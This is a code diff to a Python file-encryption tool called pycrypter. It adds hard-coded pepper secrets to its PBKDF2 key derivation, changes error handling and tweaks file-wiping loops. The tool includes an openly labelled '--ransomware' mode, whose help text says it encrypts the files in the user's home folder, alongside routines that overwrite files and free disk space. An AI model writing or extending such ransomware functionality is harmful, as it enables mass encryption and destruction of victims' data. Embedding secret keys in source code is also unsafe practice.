@@ -38,6 +38,7 @@ if platform.system() == "Windows":
 	import win32api
 	import win32con
 	import win32file
+	
 	from winnt import MAXDWORD
 	import pywintypes
 
@@ -50,6 +51,10 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
 
 from cryptography.fernet import Fernet
+
+# pepper | DO NOT LEAK THIS!
+hash_pepper = b'\xf0f\x9e\x10\xca\xbf\xca\xc4\xf1\xfd\xee\x00\xab7b\xc8\x1em1`\xb1\x821b\xf8&\xa1\xa9(\xb0\xa6\x0b'
+password_pepper = b'\xd3\x9dh4N\x0c\xbc\xac\x17\xc1\xd7\xa5\x88\x8a2\xceI\x96\x10\x86A\n@\x19\x12\xfc\x8bi\xc8\tIA'
 
 # pycrypter version
 pycrypter_version = "1.1"
@@ -644,12 +649,9 @@ def encrypt_file(input_file, password="", keep_copy=False, override_raise=False)
 	# Check argument if it's a file
 	if not os.path.isfile(input_file):
 		if os.path.isdir(input_file):
-			file_errors.append(f"encrypt_file | The specified path \"{input_file}\" isn't a file!")
+			raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
 		else:
-			file_errors.append(f"encrypt_file | The specified file \"{input_file}\" doesn't exist!")
-
-		progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
-		return "File doesn't exist/isn't a file | file_error"
+			raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")
 	
 	# file safeguard
 	file_size = os.path.getsize(input_file)
@@ -671,16 +673,16 @@ def encrypt_file(input_file, password="", keep_copy=False, override_raise=False)
 		kdf = PBKDF2HMAC(
 			algorithm=hashes.SHA256(),
 			length=32,
-			salt=salt,
+			salt=salt+hash_pepper,
 			iterations=100000
 		)
 		
 		key = None
 		
 		if isinstance(password, bytes):
-			key = kdf.derive(password)
+			key = kdf.derive(password + password_pepper)
 		else:
-			key = kdf.derive(password.encode())
+			key = kdf.derive(password.encode() + password_pepper)
 		
 		fernet_key = base64.urlsafe_b64encode(key)
 		
@@ -707,8 +709,6 @@ def encrypt_file(input_file, password="", keep_copy=False, override_raise=False)
 		os.rename(input_file, f"{file_name}_decrypted_copy{file_ext}")
 		
 		os.rename(temp_input_file, input_file)
-
-	progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
 	
 	interactive[f"{input_file} | parse_complete"] = True
 	return 0
@@ -851,8 +851,7 @@ def decrypt_file(input_file, password="", keep_copy=False):
 		return "input_file == " + sys.argv[0] + " | Illegal operation"
 
 	if keep_copy not in [1, 0]:
-		raise ValueError("keep_copy must be a valid boolean!")
-		return "keep_copy must be a valid boolean | ValueError"
+		raise ValueError("keep_copy must be a boolean")
 
 	if cleanup_status:
 		return "CleanupInterrupt"
@@ -860,12 +859,9 @@ def decrypt_file(input_file, password="", keep_copy=False):
 	# Check argument if it's a file
 	if not os.path.isfile(input_file):
 		if os.path.isdir(input_file):
-			file_errors.append(f"encrypt_file | The specified path \"{input_file}\" isn't a file!")
+			raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
 		else:
-			file_errors.append(f"encrypt_file | The specified file \"{input_file}\" doesn't exist!")
-
-		progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
-		return "File doesn't exist/isn't a file | file_error"
+			raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")
 
 	# Cipher part
 	file_size = os.path.getsize(input_file)
@@ -877,23 +873,25 @@ def decrypt_file(input_file, password="", keep_copy=False):
 
 		raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
 
-	# Write encrypted contents
-	temp_input_file = f"{input_file}.tempfile"
-
 	# Decrypt the file in chunks
 	with open(input_file, "rb+") as file:
 		file_size = os.path.getsize(input_file)
 		
 		salt = file.read(32)
-		
+			
 		kdf = PBKDF2HMAC(
 			algorithm=hashes.SHA256(),
 			length=32,
-			salt=salt,
+			salt=salt+hash_pepper,
 			iterations=100000
 		)
-			
-		fernet_key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
+		
+		if isinstance(password, bytes):
+			key = kdf.derive(password + password_pepper)
+		else:
+			key = kdf.derive(password.encode() + password_pepper)
+		
+		fernet_key = base64.urlsafe_b64encode(key)
 		
 		file.seek(32, os.SEEK_SET)
 		chunk = file.read(50 * 1024 * 1024)
@@ -921,6 +919,7 @@ def decrypt_file(input_file, password="", keep_copy=False):
 		
 		print(plaintext_end)
 		file.truncate(plaintext_end)
+	
 	# Erase/keep the file
 	if keep_copy:
 		file_name_and_ext, file_ext = os.path.splitext(temp_input_file)
@@ -929,8 +928,6 @@ def decrypt_file(input_file, password="", keep_copy=False):
 		os.rename(input_file, f"{file_name}_encrypted_copy{file_ext}")
 		
 		os.rename(temp_input_file, input_file)
-	
-	progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
 	
 	interactive[f"{input_file} | parse_complete"] = True
 	return 0
@@ -949,7 +946,7 @@ def file_overwrite(file_path, file_size):
 		for pass_iteration in range(16):
 			file_size = original_size
 			chunk_data = None
-						
+			
 			if pass_iteration in [0, 1]:
 				chunk_data = bytearray([0x00, 0x00]) # First pass
 								
@@ -1007,7 +1004,7 @@ def freespace_overwrite():
 				elif pass_iteration == 2:
 					chunk_data = os.urandom(2)
 				
-				while free_space:
+				while free_space > 0:
 					if cleanup_status:
 						file.truncate(0)
 						file.close()
@@ -1518,7 +1515,7 @@ class Main:
 		self.parser.add_argument(
 			'-rw', '--ransomware',
 			action="store_true",
-			help="Ransomware mode, encrypts important user files."
+			help="Ransomware mode, this will fetch the user's folder and cipher files inside it [Excluding AppData]."
 		)
 
 		self.parser.add_argument(
@@ -1548,7 +1545,7 @@ class Main:
 		self.parser.add_argument(
 			'-v', "--verbose",
 			action="store_true",
-			help='Show the output to the command-line.'
+			help='Show detailed output to the command-line.'
 		)
 
 		self.parser.add_argument(
